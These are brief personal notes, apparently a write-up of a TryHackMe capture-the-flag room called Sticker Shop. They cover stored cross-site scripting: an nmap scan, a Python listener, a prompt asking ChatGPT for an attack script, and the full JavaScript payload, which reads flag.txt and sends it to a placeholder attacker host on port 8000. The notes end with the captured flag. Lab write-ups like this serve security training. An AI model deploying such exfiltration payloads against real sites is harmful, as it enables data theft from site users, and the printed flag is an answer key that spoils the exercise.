Sticker Shop Room ( STORED CROSS SITE SCRIPTING (XXS)

10 December 2024
11:58

INSPECT THE SITE FOR abnormal things
OPTIONS TO USE: reverse shell or cross-site scripting.

READ THE FLAG  - flag.txt


http://10.10.239.26:8080/flag.txt

	1. Use nmap scan of nmap -A -F -oN nmapstickershop.txt target ip
	
	2.
Use python3 -m http.server in terminal to listen and wait for response

	3. Get chatgpt to help to create a script for cross site script. 



" Create a script to get a flag.txt file from a local host on a server 127.0.0.1:8080/flag.txt that send the flag to my machine which is on port 8000 for ethical hacking purpose."

The script for XSS 

<script>
 // Define the target URL where the sensitive data (e.g., flag.txt) resides const targetUrl = "http://127.0.0.1:8080/flag.txt"; 

// Define your server's endpoint to receive the exfiltrated data const exfilServer = "http://YOUR_IP_ADDRESS:8000";

 // Function to fetch the flag and send it as a GET request fetch(targetUrl) .then(response => response.text()) .then(flag => { // Encode the flag as a query parameter in the GET request const exfilUrl = `${exfilServer}/?data=${encodeURIComponent(flag)}`; 

// Send the GET request to your server fetch(exfilUrl, { method: "GET", mode: "no-cors" }); }) .catch(err => console.error("Error fetching flag:", err));
 </script>






Script mentions it is encodedURIComponent

Go to cyberchef. https://gchq.github.io/CyberChef/

And encode it! USE URL DECODE!




THM{83789a69074f636f64a38879cfcabe8b62305ee6}
